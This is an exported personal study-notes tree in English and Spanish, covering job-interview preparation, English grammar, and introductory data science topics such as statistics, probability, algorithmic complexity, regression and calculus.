    <node name="interview to new work" unique_id="147" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684704473" ts_lastsave="1684949701">
      <rich_text>
Cover letter: 1 page document that you should send with your resume to persuade the hiring manager to read it.

Complimentary closing: a word or words that come immediately before the signature of a letter to express the sender’s respect for the recipient. For example: Sincerely or Regards.

Professional experience: an experience that you obtain from a profession. It should be included in your resume in order from current to previous.

Hiring manager: the person responsible for hiring employees, to fill open job positions in a company.

LinkedIn: a social networking site that helps you create professional connections according to common areas and interests, as well as you find job opportunities.

Professional Profile: it is a brief summary of your skills, qualifications, strengths, and relevant professional experience.

Resume or Resumé: a formal presentation in a 1 or 2 page document, in which a job applicant showcases his or her contact information, professional summary, relevant work experience, education, skills and qualifications.

Improve the english
- objective and tips
   → learn how to prepare for a job interview
   → be prepared to answer interview questions
   → know the types of interviews
   → identify best practice youi can apply during interviews
- with postits
- get a plan
- review each day the progress

Prepare your professional profile
- for a looking a new job
- resume:
   → personal information and contact details
   → your professional summary
   → relevant experience (your current hob should go first)
   → education
   → skills (soft and hard skills)
   → languages
- choose a legible font such as arial or tahoma
- double check spelling and punctuation
- your resume should be 1 or 2 pages max
- do not include a photograph
- send it in PDF format

Cover letter and linkdin profile
- first page document that you should send with your resume to persuade the hiring manager
   → personal information, contact details and the date
   → recipient's name and address
   → professional greeting
   → opening paragraph that include your skills
   → include why you are the right person for the job and viceversa
   → conclusion with a call to action
   → complimentary closing and your signature
- linkedin
   → professional photo
   → a descriptive but short headline
   → ncluding your professional summary
   → highloghting projects and content you have created
   → select your strongest skills
   → expand your network and be present
   → share relevant content
   → have a personalized URL with your name and last name

Tips to prepare for the interview
- research about the company (website, social media, news)
- review the job description
- check the interview's profile
- anticipate possible questions and practice answering questions
- write down any question that you might have for the interviewer
- sleep well the night before the interview

Advantages: features that make something better than other things, and a condition that is more favorable and could give more possibilities to have a positive experience and success.

Disadvantages: the opposite of advantages; a disadvantage is an unfavorable position or condition.

Face to face Interview: an interview in which you talk directly to your interviewer in the same place, not by phone or online.

Online Interview: an interview in which the interviewer and interviewee connect through an online platform.

Phone Interview: an interview which is done over the phone.

Requirements: something that is wanted or needed, it could also be a necessary condition.

Soft solid colors: a color that has muted chroma, that was greyed, softened, or lightened, which has no patterns; a solid color is having the same color all over.

Technical Interview: an interview to test technical abilities and knowledge for a job. Usually if you apply for a job in engineering, science, or IT you may face a technical interview.

Things you should consider in an online or phone interview
- advantages
   → you save time and money
   → yuo might feel more cmfortable
   → you can have more interviews with international companies
- disadvantages
   → they are more impersonal than face to face interviews
   → there could be issues regarding the internet speed
   → you might not have enough time to expand your answers
   → if it is a phne interview you could have issues with the call or incoming calls and messages that could distract you
- tools for online inter
   → a laptop or desktop computer
   → webcam
   → headphones an microphone
   → good internet connection
- tips
   → make sure you have the link
   → sit in quiet place where you will have privacy
   → connect to the internet using a cable
   → test audio and video setting
   → be on time
   → dress professionally, use soft solid colors
   → have a neutral background
   → have a printed copy of your resume
   → close any unnecessary web browser tabs and applications
   → place your phone in silent mode
   → be calm
   → keep eye contact
   → don't excuse yourself on not having used the tool before
   → nod to show you are engaged while are actively listening
   → don't interrupt your interviewer
   → speak clearly and confidently
   → when appropriate use hand gestures and smile
   → if it's a phone interview you can't see body language so you need to work on your tine of voice
   → remember to thank the interviewer

Face to face interview
- advantages
   → more personal contact
   → you can expand your answers freely
   → you might get the opportunity to see the offices and get an idea of the work environment
- disadvantages
   → you need more time
   → you have to think more about your body language and facial expressions
   → if you are an introvert you might not feel as comfortable as in an onlne or phone interview
- tips
   → make sure you have the address and the name your interviewer
   → take a printed copy of your resume
   → arrive early
   → dress professionally
   → shake hands firmly
   → avoid looking around the room
   → sit upright and show interes
   → listen actively
   → make eye contact
   → smile when appropriate
   → speak clearly and confidently
   → answer what you are asked
   → don't interrupt your interviewer
   → be genuine
   → be polite
   → remember to thank the interviewer

Technical interview
- practice practice

Competencies: the abilities to perform a task efficiently. Competencies involve skills, abilities and knowledge. They are your qualifications for a job.

Hard Skills: learned abilities that are acquired and enhanced through practice, repetition, and education. They are teachable and measurable technical abilities that fit the job position.

Soft Skills: they are non-technical skills that relate to how you work and which are not related to a specific job.

Plain language: Clear and effective communication with straightforward expression or using only as many words as are necessary.

Pair Coding or Programming: an Agile technique originating from extreme programming in which two developers get together and code using the same screen.

Portfolio: a portable showcase of your work and talents which represent your skills and achievements.

Tell me about yourself
- professional pitch, it is a summary of the best things about you
   → whou you are
   → what you do
   → what makes you unique
   → what you have done
   → qhat you are looking for

talk about your past work experiences
- tips
   → review the experience you included in your resume
   → share what you lerned in each role and how it relates to the position you are applying for
   → be positive about previous experiences, never give a negative reason

why do you want to work for this company and why should we hire you?
- tipos
   → research the company
   → include in your answer skills and competencies that you know the company values
   → identify what the company needs
   → mention what you like about the company and why you would be a good fit for the role
   → focus on the value you will bring to your company with your skills, experience and achievements
   → give examples on how you achieved goals

Talking about your skills and competencies
- know the differences
   → competencies are much broader than skills
   → kills are specific to a task. A skill is the ability to solve problems and perform tasks
   → competencies involve skills, abilities and knowledge
- tips
   → review the job description again
   → include in your answe the skills and competencies that are relevant to the job
   → use the start method (Situation, Task, Action and Result)
   → keep your answer clear and concise
   → demostrate how you will benefit the company

Strengths and weaknesses?
- be prepared
- be brief
- be honest
- give an example

Behavioral questions: questions that have to do with how you handled past work situations.

Call someone out: an expression which has to do with telling someone about something they did or said and asking them for an explanation.

Job setting / Work setting: your work environment, the place where you work.

Role play: A dramatization in which you perform or act out the part of a person or character in a situation in order to make the topic more clear.

Situational questions: questions about hypothetical work situations. They allow the interviewer to know how you would act if they happened.

the salary expectation question
- tips
   → don't ask about the salary before you are asked about it
   → you could divert the question by saying yu neer more information about the role requirements and expectations
   → be aware of your market value and cost of living
   → be ready to specify your required salary range and explain why
   → be prepared to negotiate
   → you could say you are open to negotiationg depending on the benefits, commissions or bonuses

Where do you see yourself in 5 years/
- tips
   → think of your long-term goals and your career path
   → show confidence and a positive attitude
   → demostrate how the role will help you reach your goals
   → talk about mentoring
   → show enthusiam and passion

Answering situational questions
- problem, how to solve and benefit the company
- consider the skills required for rol
- benefist for the company

Being late: Not being on time for a scheduled meeting or event.

Follow up: to investigate closely in order to have a status or more information as a response to something.

If applicable: It expresses that you should consider if something has to do with you, if it is relevant or if it applies.

Mistake: an act or judgment that is not right; something that you are wrong about.

Role: a purpose or position that a person has in a company, a situation, society, or in a relationship; it is related to a duty or obligation that the person has.

Write down: to record something in written form in a piece of paper.

Question for the interviewer
- show activily listening
- examples
   → how would you describe the company culture
   → what do you like most about working here
   → how do you define and measure success for this role
   → what are the three most important things that you would like me to accomplish in the first six months if I were hired
   → what do you think is the mos challenging aspect of this position
   → will I have the opportunity to meet the team during the interview process
   → are thre opportunities for professional growth

HOw to close the job interview effectively and what to do after the interview
- all question were answered
- state your interest and why you are the right person for the job
- you ask for the next steps and how you should follow up
- get the contact information you need
- close the interview on a positive note
- thank the hiring manager
- after the interview
   → analyze your answer and how you felt
   → write down things you want to remember from the interview
   → contact the references you proveded (if applicable)
   → connec with your interviewer
   → send an email thanking for the interview
   → follow up on the process
   → be prepared to wait
   → do not stop the job search

Common mistakes
- being late
- lying
- not being prepared
- having your cell phone with notifications on
- not making any eye contact
- bad posture
- not dressing appropriately
- not asking questions
- asking about holidays or bonuses at the initial interview
- saying that you have applied to a lot of jobs
- making negative comments about your current job
- not following up agter an interview</rich_text>
    </node>
    <node name="Adverbs and nouns" unique_id="148" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685419547" ts_lastsave="1685757050">
      <rich_text>Questions using what and which
- what, multiple possible answers
- which, possible answers are limited, is possible limit as example: which color do you prefer, </rich_text>
      <rich_text style="italic">blue or red?</rich_text>
      <rich_text>, with context is used

Questions using whose
- asking to whom something belongs
- in singular
   → whose computer is it?
   → it's jack's computer
- in plural
   → whose shoes are they?
   → they're Sara's shoes

Verbs of perception using can and can't
- verbs of perception (physical senses)
   → touch
   → sight, see, look at, watch
   → hearing, hear, listen to
   → smell
   → taste, probar
- ability to do something in the present

Vocabulary: Leisure (ocio) activities
- hang out with friends
- relax at the beach
- meditate
- go hiking
- go snorkeling
- go camping
- play board games
- go fishing
- chill out
- go parting
- go bike riding
- go for a walk
- </rich_text>
      <rich_text weight="heavy">RECORDING</rich_text>
      <rich_text>

Common time expressions
- present
   → today
   → now - right now
   → at the moment
- past
   → yesterday, the day before yesterday
   → last (week, weekend, month, year, friday...)
   → one, two, three (years, months, weeks, days) ago
- future
   → tomorrow, the day after tomorrow - tonight
   → next (week, weekend, month, year, friday...)
   → In one, two, three (years, months, weeks, days, hours)

Personal plans and intentions for the future using “going to”
- subject + verb to + going to + verb
- verb + subject + going to + verb?
- how to use:
   → we're going to go hiking next week

Talking about the future using “will”
- is is used to talk about future possibilities
- structure
   → subject + (will|will not|won't) + verb
   → will + subject + verb?
- how to use
   → hummanity will live on the moon in 100 years

Using let's for invitations and suggestions
- it's the short for “Let us”
- let's + invitation/suggestion
   → ex: let's have a drink

Countable and uncountable nouns
- countables
   → oranges
   → apple
   → cookies
   → burger
   → carrot
   → french fries
- uncountable
   → rice
   → cheese
   → water
   → pasta
   → milk
   → cereal

How many and how much
- many
   → use with countable nouns
   → there are many apples
   → are there many eggs?
- much
   → uncountable nouns
   → there is much water
   → Is there much milk?

Countable plural nouns
- form a plural noun it's necessary to add -s at the end
- is some cases is necesary use es, when finish in consonant
- when finish with Y replace with ies
- wolf is wolves
- exists exceptions:
   → person - people
   → woman - women
   → man - men
   → child - children
   → mouse - mice
   → foot - feet

Using the article THE
- used when you refer to something previously mentioned
- with vowels and consonants sound different, with vowels is like i and with consonants is like e

Using “would like to” to place orders and offers
- it is used in specific orders or orders
- would like to + offer or order
- contraction “I'd like to”

Adverbs and prepositions
- adverbs:
   → abroad
   → away
   → here
   → there
   → inside
   → outside
   → in
   → out
   → up
   → down
   → upstairs
   → downstairs
   → anywhere
   → somewhore
- Prepositions
   → onto
   → off
   → over
   → away
   → toward
   → past
   → into
   → out
   → around
   → under
   → though
   → across
   → up
   → down

Adverbs of place and motion
- place
   → where something happens
- motion
   → specific direction of movement, is more especific

Prepositions of motion
- they show movement from one place to another
   → onto
   → off
   → over, sobre
   → away
   → toward
   → past
   → into
   → out
   → around
   → under
   → through
   → across
   → up
   → down

using “please” with imperative verbs
- they are used to make requests
- help me, + please, requests
- listen to me, + please
- add don't for a negative requests

using “because” with verb phrases
- why? -&gt; because
- to refer to causes and reasons
- verb to be|can|could|must|should|will|have/has + verb = verb phrases
   → can paint
   → are meditating
   → must do

</rich_text>
    </node>
    <node name="Quantities and gerunds" unique_id="152" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685941303" ts_lastsave="1687311206">
      <rich_text>superlative using most and -est
- the highest or lowest limit of a quality
- adjective and adverbs, adjectives describe an anoun, places or something, adverbs are actions
- the + superlative adjective + noun
- one syllable
   → big, biggest
   → nice, nicest
- two syllable
   → happy, happiest
   → simple, most simple
- three or more syllables
   → beautiful, use of most
   → expensive, “       ”
- irregular
   → good, the best
   → bad, the worst

Nouns without articles
- structures
   → nouns - article
- countables
   → egg
   → tomato
   → box
   → chair
   → dog
   → penguin
   → child
   → foot
- uncountable
   → food and drinks
   → weather
   → general
   → abstract
- zero dummy quantifier
   → uncountable without articles
   → people, things or situations
   → examples:
      ⇒ life is beautiful
      ⇒ I don't like homework
      ⇒ peaple are kind (amable)
      ⇒ sunny likes apples, but not oranges

Some, a lot of, lots of
- countable and uncountables
- affirmative, negative and questios
- some: unspecified amount or number of something
- a lot of/ lots of: large amount or number of something, this is interchangable
- example:
   → he drinks a lot of water
   → he is drinking some water
   → he has a lot of money
   → he has som money

Nouns with countable and uncountable meanings
- what are the top 10 cheeses? - types
- I'd like three coffees to go, please - cups of coffee
- context is very important

Quantifiers with of (lots, some. a bit, a lot)
- followed by nouns, pronouns, determiners, or a possessive form before a noun
- some, smaller
- bit, smollest

Comparative with longer adjectives
- comparison between two or a groups of things
- adjectives and adverbs
- more + adjective + than
- adjectives
   → beautiful
   → interesting
   → expensive
   → dangerous
   → intelligent
   → difficult
- example:
   → maths is more difficult than english

rules:
- general add -er
- if ends with e add -r
- if ends in consonant + single vowel + consonant, double consonant and add -er
- if ends with consonant + y change to -ier
- more of 2 syllables add more in front
- irregulars:
   → bad - worse
   → far - farther/further
   → good - better
   → little - less
   → much - more

Adverbs of frequency
- always
- usually
- sometimes
- hardly ever
- never
- usually go in the mid position
- always, never and ever don't usually go in the front position

Adverbs and adjectives
- -ly
- adjectives describe things
- adverbs, describes perform actions, describe adjectives
- adverbs = adjectives + -ly</rich_text>
    </node>
  </node>
  <node name="Ciencia de datos" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617689129" ts_lastsave="1697502469">
    <node name="examenes de secciones" unique_id="115" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664320597" ts_lastsave="1664407685">
      <rich_text>¿Cuál es el orden correcto al solucionar una operación aritmética?
La estructura adecuada de argumentos dentro de la función condicional "SI" es:
La gráfica adecuada para mostrar participación por categoría es:
¿Qué expresión simbólica es correcta para la relación “El triángulo ABC es congruente con el triángulo XYZ”?

Un lienzo de  90 m se corta en 3 trozos: trozo A, trozo B y trozo C. Calcular cuánto  mide el trozo B; sabiendo que el trozo B y el trozo C miden el doble y  el triple que el trozo A, respectivamente., 30
Es un método de solución de ecuaciones lineales:
¿Cómo se relaciona data science con inteligencia artificial?
Las aplicaciones de movilidad facilitan la integración social sugiriendo recorridos hacia todas las zonas sin distinción. Esto es:

Es el resultado de elevar al cuadrado la expresión 5x²y
Son los sumandos que forman los miembros:
La utilidad principal de Excel es:
En Excel la herramienta Filtro es Ăºtil para todas estas cosas, excepto para:
</rich_text>
    </node>
    <node name="Analisis de negocios" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617689619" ts_lastsave="1618440726">
      <rich_text>¿Que es la ciencia de datos?
- big data: gran volumen de información
- solución matemática a un problema de negocio
Empresas con gran volumen de información:
- facebook
- bancos
- sintrafico

Tipos de datos
existen 5 tipos de datos principales
- personas, la generamos nosotros, preferencias, información de tiempo con personas
- transacciones, monetarias y no monetarias, flujo de dinero las primeras (que s epaga y en donde), las no financieras son como las compañias telefonicas (patrones de conducta)
- navegación web, cookies, registros de información desde el browser
- machine 2 machine, dispositivos de GPS, movilidad
- biométricos, es información unica y con debate etico
empresas
facebook: personas, información de gustos
bancos: transacciones monetarias (ver que se compra y con que frecuencia)
sintrafico: machien 2 machine

Cultura data-driven
1. crear cultura, hacer que todos tomen decisiones de acuerdo a los datos (hay que enseñar que son los datos)
2. recolectar (almacenaje y procesado)
3. medir todo (entender la data y por que)
4. datos precisos y relevantes (que es lo que realmente sirve de lo que tenemos, que sea precisa y estandar, tener datos que tenga los datos lo mas identicos posibles)
5. testear y crear hipotesis (saber que puede pasar y por que pasa, patrones especificos)
6. insights para tomas acciones (saber que vamos a hacer una vez con data recolectada)
7. automatizar &lt;3 . &lt;3

Machine learning e inteligencia artifical
la inteligencia articial es lo que se conoce como maquina inteligente
machine learning es el aprendizaje por la computadora y que se pueda mejorar
el machine learning nos sirve para
- detección de fraudes
- búsqueda web
- anuncios a tiempo real
- análisis de textos
- next best action
tres empresas:
- facebook
- amazon
- mercado libre

Deep learning
es el aprendizaje profundo, nos sirve generalmente para las saber que tipo de imagen es o que canción, son modelos con mucho entrenamiento

Roles en datos
- Ingeniero de datos, construye la informacion a almacenar, obtiene información y la guarda
- Analista BI, partiendo de la información guardada la extrae para información que le interese
- Data Scientist, predice por medio de modelos, explica las situaciones de la empresa (pasado, presente y futuro)

Herramientas
- SQL, analista e ingeniero de datos
- Python Y R, cientifico de datos analisis descriptivo y exploratorio

Conflictos de los datos
- hay información delicada de los usuario

Técnicas de storytelling
Estructura del problema: problema, solución, alcance (que se quiere explicar con este estudio)

Estructurar un caso de negocio:
que? - cual es el problema del negicio
por que? - cuales son los motivos o causas
como?:
	- análisis cuantitativo
	- análisis cualitativo
	- matriz cuantitativa-cualitativa
	- definir acciones
	- validación

Análisis cuantitativo
- identificar variables numericas
- cuales nos son utiles

Análisis cualitativo
- variables cualitativas
- clusterizar causas de contacto, agrupar problematicas
- clasificación
- profundizar

Toma de decisiones:
- </rich_text>
    </node>
    <node name="POO" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1618776094" ts_lastsave="1619095024">
      <rich_text># Programación básica en POO-Python
- es un modelado del mundo
- se puede decomponer

# Complejidad algoritmica
- es la comparacion de la eficiencia de dos diferentes algoritmos
- predice el tiempo en resolver un problema
- se puede definir como T(n)
- hay dos tipos, la temporal y espacial

Aproximaciones:
- tiempo de respuesta 1 vs 1, tiene el problema de depender del hardware o software, schedulers
- Contar pasos como medida abstracta, operaciones matematicas... puede ser mas eficiente, la solucion varia de programa a programa a nivel algoritmico
- Contar pasos asintoticamente, para el crecimiento

# Conteo abstracto
- aproximación del tipo matematico
- se cuenta que pasa adentro del programa
- se suma cada operacion que se hacen (los loops por cada una de las iteraciones)
- se puede representar las operaciones de loops en x, lo que puede darnos parabolas

# Notación asintótica
- conocido como “Big O notation”, esto se llama asi ya que se va acercando al infinito o se va acercando
- el input generalmente es que el que nos da esta salida
- existen otros tipos de notaciones
- este tipo de notación se puede saber sumando los ‘n’ pasos que vamos requiriendo en el algoritmos
- se toma el termino mas grande por ej. si queda ‘n’ vs ‘n**2’ se toma el ‘n**2’

# Clases de complejidad algoritmica
- O(1) este siempre sera constante, no importa cuando cresca el input
- O(n) Lineal, se crece de manera proporcional al imput
- O(log n) Logaritmica, crece mucho y de poco a poco se estabiliza, mergesort
- O(n log n) logaritmico lineal, crece de manera logaritmica pero constantemente
- O(n**2) Polinomial
- O(2**n) exponcial, este crece mas rapido que el polinomial, este es el menos efectivo ("tiralos a la basura"), son muy bueno a nivel teorico

# Busqueda lineal
- busqueda de manera secuencial
- el peor de los casos es que el elemento que se busca esta al final
- de tipo O(n)

# Busqueda binaria
- divide y conquistaras
- se parte en 2 en cada iteración
- asume que esta ordenada

# Ordenamiento de burbuja
- de tipo O(n**2)

</rich_text>
    </node>
    <node name="Probabilidad y Estadistica, marce" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1619978072" ts_lastsave="1623388351">
      <rich_text># Conceptos básico
- Probabilidad, que tan posible es que ocurra un evento
   → la probabilidad siempre va entre 0 y 1
   → se puede escribir en fraccion, decimal o porcentaje
   → la probabilidad nunca es negativa
   → se escribe P(A)
- Experimento: se busca un valor determinado, proceso que nos da los datos estadisticos a estudiar
   → numericos: numeros
   → no numericos: colores, nombres
- Espacio muestral: conjunto de valores que se obtienen en el experimento, se define por la letra Omega
- Suceso, son cada uno de los resultados que se obtienen en el experimento
   → posible: existe la probabilidad de que se obtenga lo que quiere
   → seguro: si todo el espacio muestral esta definido por lo que se necesita
   → imposible: que no se tenga el valor que se quiere

# Calculo de probabilidades
- Experimentos equiprobables: Cada suceso del espacio muestral tiene la misma probabilidad de ocurrencia
- Regla de Laplace: P(A) = Casos favorables de A / Casos posibles

# Probabilidad compuesta y diagramas de árbol
- es donde intervienen mas de un experimento aleatorio
- se hace la multiplicación de cada evento que tenemos
- los diagramas de arbol pueden ayudar a saber que probabilidad le toca a cada evento

# Union
- compatibles: encuentra los resultados necesarios en cada uno de los universos creados
   → P(AUB) = P(A) + P(B)
   → P(AUB) = P(A) + P(B) - P(A^B)
- incompatibles: no encuentra el resultado dentro de uno de los universos
- complementarios: cuando ambos universos se unen y crean todo el espacio muestral

# Intersección
- Suceso formado que cumplen a y b
   → P(A^B) = P(A) * P(B)
   → P(A^B) = P(A/B) * P(B) donde:
      ⇒ P(B/A) = P(A^B) / P(A). si P(A) != 0

# Variaciones, permutacion y combinaciones
- Combinatoria, estudia las agrupaciones partiendo de un conjunto de acuerdo al orden y al número de elementos
-  variaciones, subgrupos que ocurren cuando se agrupan cierto numero de elementos en una cantidad especifica 
   →  V(n,r) = n! / (n - r)!
- permutacones: Son variaciones de n elementos tomados en grupos de r, donde n = r
   → p(n) = n(n-1)(n-2)...(1) = n!
- combinaciones: Se obtienen al seleccionar de n elementos un subgrupo r, aqui si importa que no se repitan, se calcula a partir de:
   → C(n,r) = n! / r!(n - r)! = (n /n r) = C(n,r) = V(n, r) / P(r)

# Tabla de frecuencias
- la distribucion de datos, sirve para saber que metodo estadistico es el correcto a usar
- los datos se pueden presentar:
   → graficas
   → textual
   → en cuadros estadisticos
- la organizacion de datos es por medio de una tabla de frecuencias donde se muestra que tanto se repiten los datos
- la frecuencia absoluta es cada uno de los valores que tiene por valor
- la frecuencia absoluta acumulada es la suma la de la actual mas la anterior
- la frecuencia relativa es la division de la frecuencia absoluta entre la frecuencia total
- la frecuencia relativa acumulada es la suma de la frecuencia relativa mas su anterior

# Gráfica de dispersión
- Relaciona los datos de estudio, por medio de sus variables
- se representa por medio de un diagrama matematico
- Se le conoce como nube de puntos, son variables bidimensionales, sabiendo que tanto afectan o dependen de ellas

# Parametros estadisticos, centralización
- centralizacion: son valores recogidos, que representan de forma global a la muestra o poblacion
   → media: es la suma de todas las observaciones dividivo por el numero de observaciones
   → mediana: Es el valor de posición de datos ordenados, se toma el que esta en medio
      ⇒ par = X=X(n+1) / 2
      ⇒ impar= (X=X(N/2) + X(N/2+1)) / 2
   → moda: Es el valor que tiene mas repeticiones de datos

# Tipos de correlación o covarianza
- existen tres tipos de correlaciones
   → Directa: se da cuando una variable aumenta y la otra también o de caso inverso
   → Inversa: se presenta cuando una variable aumente la otra disminuye y en caso inverso
   → Nula: cuando no se encuentra ninguna relacion entre variables
- Covarianza: es la media aritmetica de los productos de las desviaciones de cada una de las variables respecto a sus medias respectivas

# Rango (Dispersion de distribuciones)
- son una serie de valores que indican que tan dispersos, juntos o separados estan los datos, esto de acuerdo a las medidas centrales
- rango o amplitud, es el recorrido de la distribución estadística, es la distancia que hay entre el mayor y menor
- para datos agrupados, el recorrido es la diferencia entre el límite real superior del ultimo intervalo y el primer intervalo
- mide la dispersion total de todos los elementos

# Desviacion media
- es la media aritmetica de los valores absolutos de todos los datos respecto a la media aritmetica

# Varianza y desviacion estandar
- desviacion estandar raiz cuadrada de la varianza
- varianza, que tan separados estan los datos

# Coeficiente de correlación
- es una valor cuantitativo
- relacion entre dos variables
- la proporcionalidad positiva esta dada por 1, negativa por -1, si no existe es igual a 0
- es a covarianza de x, y entre las desviaciones tipicas de x y de y

# Cuartiles, deciles y percentiles
- Cuartiles son valores que dividen a la población en 4 partes iguales, representan al 25%, 50% y 75% de los datos, el 2 representa la mediana
- Deciles divide a los valores en 9 partes, el 5 representa la mediana
- Percentiles divide el conujunto de datos en 100 partes iguales el percentil 50 coincide con la mediana

# Que es y para que sirve la regresion logistica
- regresion simple, a partir de datos como la correlación y los datos tabulados, se puede encontrar un valor futuro que se puede predecir
- la formula es x(i) = a + bt
</rich_text>
    </node>
    <node name="regresion-python" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620426905" ts_lastsave="1620654556">
      <rich_text># Regresion líneal y machine learning
- machine learner, usando modelos de regresion lineal
- prediccion de datos por medio una linea, los datos que esten mas cerca de ella
- por medio de variables ‘x’ y ‘y’
- se puede sobreajustar o underfit puede dar predicciones reales
- regresion lineal para regresiones
- regresion logistica es para clasificaciones
- naive bayes clasificacion
- KNN regresion y clasificacion
- arboles regresion y clasificacion

# Explicacion matemática de la regresión líneal
- termino estadistico, modelo matematico, relacion entre una relacion dependiente e independiente
- y = bo + biX
   → y: dependiente
   → X: independiente
   → bo: constante
   → bi: pendiente, inclinacion del sistema

# Metodo de mínimos cuadrados
- sumatoria de x menos promedio de x multiplicado por y menos y promedio y se divide entre la sumatoria de los cuadrados de x menos promedio de x
   → sum ((x - avg(x)(y - avg(y)) / sum (x - avg(x))^2
   → sirve para encontrar la inclinación
- con el pomedio de puntos se puede encontrar bo, siendo y = avg(y) y la x = avg(x), y b1 es la inclinación</rich_text>
    </node>
    <node name="Calculo basico" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1621260505" ts_lastsave="1622078620">
      <rich_text># Aprendamos calculo
- las matemáticas son un lenguaje, sirven para modelar y entender fenomenos de nuestra realidad
- Descenso del gradiente es lo final

# Qué es el cálculo?
- realizar operaciones para llegar a un resultado
- calculo infinitesimal, cuando las cantidades tienden a ser cercanas a 0
- calculo diferencial, estudia la tasa de cambio de las funciones, los cambios pequeños se conocen como delta x
- calculo integral, es el proceso inverso del diferencial

# Que es una funcion
- es una regla donde cada elemento de A, se le asigna un elemento del conjunto B
- una funcion es como una maquina, y = f(x)
- una funcion se puede representar:
   → Verbalmente
      ⇒ de forma verbal, diciendo el problema
   → Numéricamente
      ⇒ se puede representar a lo largo de una tabla, donde tenemos x y y en cada columna
   → Visualmente
      ⇒ se muestra por medio de una gráfica
   → Algebraicamente
      ⇒ este se representa de y = f(x) = x^2

# Dominio y rango de una función
- el dominio, se define como los valores que toma x y estan definidos en f(x)
- el rango, son todos los resultados que nos da x una vez resuelta

# Como se compone una neurona
- dentro de una neurona se tiene una funcion, donde recibe estimulos (entradas)
- hace sumas ponderadas de los valores de entrada
- se les agrega un peso determinado (W)
   → y = f(x) = W1x1 + W2x2 + b
   → y = f(x) = W1x1 + W2x2 + ... + Wnxn + b
   → bias, es constante es un rango para ajustar el valor

# Funciones activadoras de neuronas
- las funciones de activacion nos da una linea curva, se ajusta al comportamiento de los datos
- tipos:
   → paso escalonado, heaviside, su rango esta dado con [0, 1], solo toma o valor 0 o 1
   → funcion sigmoide, es una curva que parte en 0.5, sus valores van de 0 a 1, pero no los toca, f(x) = 1 / (1 + e^-x), su rango va de (0, 1), puede tomar cualquier valor de 0 a 1
   → funcion tangente hiperbolica, su rango va de (-1, 1) y toma cualquier valor, tanh(x) = (e^x - e^-x) / (e^x + e^-x)
   → funcion ReLU, funcion rectificada lineal f(x) = max(0, x), 0 para x menores o iguales a 0 y x para valores mayores a x

# Función de coste
- se calculan que tan alejados estan los datos reales de la predicción
- (y_pred - y_real)^2 = error
- error_total = sumatoria de i = 1 hasta n de error dado por la prediccion - datos reales al cuadrado
- ECM = 1 / n (sum_i=1_n (y_prom - y)^2)

# Que es un limite
- se puede decir que es a que valor tiende una funcion en un punto dado

# De donde surge la derivada
- surge para saber la tangente a una curva
- linea que toca la curva en un solo punto
- el punto se evalua en x + delta_x, esto s una razon de cambio, donde hay un movimento
- el incremento sirve para saber con mayor exactitud la pendiente, esto cuando ese incremento esta muy cerca uno del otro

# Máximos y mínimos
- teorema de la primera derivada
   → Si f’(x)&gt;0 hacia la izquierda de un punto a y si f’(x)&lt;0 hacia la derecha del punto a, entonces f tiene un máximo relativo en (a, f(a))
   → Si f’(x)&lt;0 hacia la izquierda de un punto a y si f’(x)&gt;0 hacia la derecha del punto a, entonces f tiene un mínino relativo en (a, f(a))
   → Si f’(x) es menos o mayor de ambos lados, no es ni un máximo ni un mínimo
- Teorema de la segunda derivada
   → Si f’’(x)&lt;0 entonces f tiene un máximo relativo en (x, f(x))
   → Si f’’(x)&gt;0 entonces f tiene un mínimo relativo en (x, f(x))
   → Si f’’(x)=0 no se puede determinar si es un máximo o un mínimo o ninguno de los dos. Se debe utilizar el teorema de la primera derivada para poder determinarlo

# Parciales
- con la parcial de X, se encuentra la tangente que esta sobre x, mientras que la de y nos ayuda a encontrar la que esta con y
- con ambas se puede encontrar un plano que pase sobre la curva

# Gradiente
- Vector que nos dice donde asciende de manera mas rapida na superficie
- se representa con nabla y es la derivada parcial de x + la derivada parcial de y

# Descenso del gradiente
- para optimizacion de funciones
- es un proceso iterativo para mejorar la funcion, se puede representar como:
   → w : w - {alpha}{grad}F
- la limitacion es que si tienen muchas curvas puede caer en un minimo muy pequeño o puede variar mucho</rich_text>
    </node>
    <node name="Probablidad" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1622420216" ts_lastsave="1653857321">
      <rich_text># Que es la probablidad?
- se usa en situaciones donde hay incertidumbre
- El azar no es mas que la medida de nuestra ignorancia. los fenomenos fortuitos son aquellos cuyas leyes o causas simplemente ignoramos
- la toma de decisiones con informacion incompleta
- lenguaje y conjunto de herramientas, para cuantificar la incertidumbre
- axioma: P = N. de sucesos exitosos / N. de sucesos totales
- escuelas:
   → frecuentista, son numero que solo se alcanzan en infinitas ocasiones, tiene tendencia a 1/2 por ejemplo la moneda
      ⇒ espacio muestral, espacio donde estan todos los eventos elementales
   → bayesiana
- sucesos:
   → elemental, que va a pasar sin restriccion
   → suceso: resultado con alguna restriccion, es algo mas general
- Espacio muestral: donde estan toda las ocurrencias que van a pasar
- Axiomas:
   → P = numero de sucesos exitosos / numero de sucesos totales
- propiedades:
   → va del 0 al 100
   → si es 100 es certeza
   → si es 0 es imposibilidad
